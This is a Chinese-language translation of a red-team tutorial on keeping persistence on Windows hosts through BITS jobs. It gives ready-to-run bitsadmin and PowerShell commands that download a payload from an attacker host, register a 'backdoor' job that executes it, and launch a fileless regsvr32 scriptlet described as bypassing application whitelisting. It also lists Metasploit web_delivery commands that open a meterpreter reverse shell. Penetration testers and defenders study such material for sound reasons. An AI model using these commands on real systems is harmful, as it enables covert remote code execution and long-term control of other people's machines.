# Window权限维持（六）：BITS Jobs

来源: 03-干货系列\Window权限维持整理\Window权限维持（六）：BITS Jobs.pdf

Windows操作系统包含各种实用程序，系统管理员可以使用它们来执行各种任务。这些实用程序之一
是后台智能传输服务（BITS），它可以促进文件到Web服务器（HTTP）和共享文件夹（SMB）的传
输能力。Microsoft提供了一个名为“ bitsadmin ” 的二进制文件和PowerShell cmdlet，用于创建和
管理文件传输。
从攻击的角度来看，可以滥用此功能，以便在受感染的主机上下载有效负载（可执行文件，
PowerShell脚本，Scriptlet等）并在给定时间执行这些文件，以在红队操作中保持持久性。但是，与“
bitsadmin ” 进行交互需要管理员级别的权限。执行以下命令会将恶意有效负载从远程位置下载到本地
目录。
Bitsadmin –文件传输
还有一个PowerShell cmdlet可以执行相同的任务。
BitsTrasfer –传输文件PowerShell
将文件放入磁盘后，可以通过从“ bitsadmin ”实用程序执行以下命令来实现持久性。用法非常简单：
1. 在创建参数需要作业的名称
2. 该addle需要文件的远程位置和本地路径
3. 该SetNotifyCmdLine将执行的命令
bitsadmin /transfer backdoor /download /priority high 
http://10.0.2.21/pentestlab.exe C:\tmp\pentestlab.exe
Start-BitsTransfer -Source "http://10.0.2.21/pentestlab.exe" -Destination 
"C:\tmp\pentestlab.exe"

4. 所述SetMinRetryDelay定义时间回调（秒）
5. 该简历参数将运行位工作。
持久性--BITS Jobs 当作业在系统上运行时，有效负载将被执行，Meterpreter会话将打开，或者通信
将被接收回命令和控制（取决于场合中使用的C2）。
持久性– BITS Jobs Meterpreter
bitsadmin /create backdoor
bitsadmin /addfile backdoor "http://10.0.2.21/pentestlab.exe" 
 "C:\tmp\pentestlab.exe"
bitsadmin /SetNotifyCmdLine backdoor C:\tmp\pentestlab.exe NUL
bitsadmin /SetMinRetryDelay "backdoor" 60
bitsadmin /resume backdoor

参数SetNotifyCmdLine也可以用于通过regsvr32实用程序从远程位置执行scriptlet 。这种方法的好
处是它不会接触磁盘，并且可以避开将应用程序列入白名单的产品。
BITS Jobs – Regsvr32
Metasploit框架可用于通过Web交付模块捕获有效负载。
BITS Jobs – Regsvr32
bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe "/s /n /u 
/i:http://10.0.2.21:8080/FHXSd9.sct scrobj.dll"
bitsadmin /resume backdoor
use exploit/multi/script/web_delivery
set target 3
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.2.21
exploit

译文声明：本文由Bypass整理并翻译，仅用于安全研究和学习之用。
原文地址：https://pentestlab.blog/2019/10/30/persistence-bits-jobs/
 
